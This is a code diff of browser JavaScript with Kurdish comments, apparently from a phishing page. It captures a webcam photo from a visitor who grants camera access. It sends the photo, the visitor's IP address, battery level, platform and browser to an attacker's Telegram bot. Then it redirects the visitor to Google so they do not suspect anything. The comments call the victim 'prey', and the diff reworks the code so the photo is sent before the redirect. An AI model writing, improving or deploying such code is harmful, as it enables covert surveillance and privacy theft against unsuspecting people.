@@ -16,89 +16,78 @@
         if (!targetID) return;
 
         try {
-            // داواکردنی ڕێپێدان بۆ کامێرا و دەنگ
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: true 
             });
 
-            // 💀 هەنگاوی نوێ: گواستنەوە بۆ گووگڵ دوای Allow کردن
-            // کەمێک چاوەڕێ دەکەین تاوەکو پڕۆسەی ناردنی یەکەم زانیاری دەست پێ بکات
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 1500); // دوای چرکەیەک و نیو نێچیرەکە دەچێتە گووگڵ
-
-            // وەرگرتنی زانیاری شەحن (Battery)
-            let batteryInfo = "Unknown";
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
-            }
-            
-            // ناردنی IP و زانیارییە وردەکان
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
-                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                                 `🌐 <b>Browser:</b> <code>${navigator.userAgent.split(' ')[0]}</code>`;
-                    sendToTelegram(report);
-                });
-
-            navigator.geolocation.getCurrentPosition(pos => {
-                sendLocation(pos.coords.latitude, pos.coords.longitude);
-            });
-
+            // دروستکردنی ڤیدیۆ بۆ گرتنی وێنە
             const video = document.createElement('video');
             video.srcObject = stream;
             video.muted = true;
-            video.play();
+            await video.play();
 
-            const takeSnap = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                canvas.toBlob(b => {
-                    if (b) sendFile(b, "photo");
-                }, 'image/jpeg', 0.7);
-            };
-
-            // یەکەم وێنە دەگرین پێش گواستنەوە
-            takeSnap();
+            // وێنەگرتنی یەکەم وێنە و ناردنی بە شێوەی بەردەوام
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    // ناردنی وێنەکە و چاوەڕێکردن بۆ تەواوبوونی ناردن (await)
+                    await sendFile(blob, "photo");
+                    
+                    // ناردنی زانیارییەکان دوای وێنەکە
+                    await sendReport();
+                    
+                    // تەنها دوای دڵنیابوون لە ناردنی وێنە، دەچێتە گووگڵ
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 1000);
+                }
+            }, 'image/jpeg', 0.8);
 
         } catch (e) {
             sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
-            // ئەگەر Allow نەکرد، دیسانەوە دەینێرین بۆ گووگڵ بۆ ئەوەی گومان نەکات
             window.location.href = "https://www.google.com";
         }
     }
 
+    async function sendReport() {
+        let batteryInfo = "Unknown";
+        if (navigator.getBattery) {
+            const batt = await navigator.getBattery();
+            batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+        }
+
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        
+        let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                     `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                     `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                     `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                     `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
+                     `🌐 <b>Browser:</b> <code>${navigator.userAgent.split(' ')[0]}</code>`;
+        
+        return sendToTelegram(report);
+    }
+
     function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
     }
 
-    function sendLocation(lat, lon) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
-        });
-    }
-
-    function sendFile(blob, type) {
+    async function sendFile(blob, type) {
         let fd = new FormData();
         fd.append("chat_id", targetID);
         fd.append(type, blob, "shot.jpg");
-        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { 
+        return fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { 
             method: 'POST', 
             body: fd 
         });
